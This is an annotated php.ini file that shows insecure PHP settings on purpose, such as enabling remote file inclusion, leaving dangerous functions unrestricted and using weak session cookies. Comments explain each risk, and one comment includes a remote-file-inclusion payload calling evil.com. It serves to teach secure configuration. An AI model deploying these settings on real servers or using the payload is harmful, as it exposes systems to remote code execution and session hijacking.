; /etc/php/8.2/fpm/php.ini — DANGEROUS DEFAULTS (DO NOT USE IN PRODUCTION)
; This represents a typical out-of-the-box or lazily configured PHP installation.
; Each setting below represents a real security vulnerability.

; ❌ Exposes PHP version in HTTP headers (X-Powered-By: PHP/8.2.1)
; Enables fingerprinting → targeted CVE exploitation
expose_php = On

; ❌ Prints errors directly to browser
; Leaks: DB hostnames, usernames, database names, file paths, credentials, stack traces
; CWE-209: Information Exposure Through an Error Message
display_errors = On
display_startup_errors = On

; ❌ Doesn't log errors to file — you'll miss server-side issues
log_errors = Off

; ❌ Reporting level doesn't matter much since errors are shown to users anyway
error_reporting = E_ALL

; ❌ No function restrictions
; Attacker code can call exec(), passthru(), system(), shell_exec(), proc_open(), popen()
; These allow OS command execution → full server compromise
disable_functions =

; ❌ No class restrictions
disable_classes =

; ❌ PHP can open arbitrary remote URLs using standard file functions
; Enables SSRF (Server-Side Request Forgery) via fopen(), file_get_contents(), etc.
allow_url_fopen = On

; ❌❌ WORST SETTING: Allows remote file inclusion
; Attacker tricks app into: include($_GET['page'] . '.php') → ?page=http://evil.com/shell
; = Full Remote Code Execution. Deprecated in PHP 7.4, still found in legacy systems.
allow_url_include = On

; ❌ File uploads enabled with massive size limit
file_uploads = On
upload_max_filesize = 100M

; ❌ No memory limit — DoS attacks can exhaust all server RAM and crash the box
memory_limit = -1

; ❌ Very long max execution time — enables slow DoS attacks
max_execution_time = 300

; ❌ Session security risks:
; - JavaScript CAN read session cookie → XSS + session hijacking
; - Cookie sent over HTTP → interception risk
; - Unrecognized session IDs accepted → session fixation
; - No SameSite → CSRF attacks via cookies
session.cookie_httponly = 0
session.cookie_secure = 0
session.use_strict_mode = 0
session.cookie_samesite =
session.use_only_cookies = 0   ; Session ID can be passed in URL!
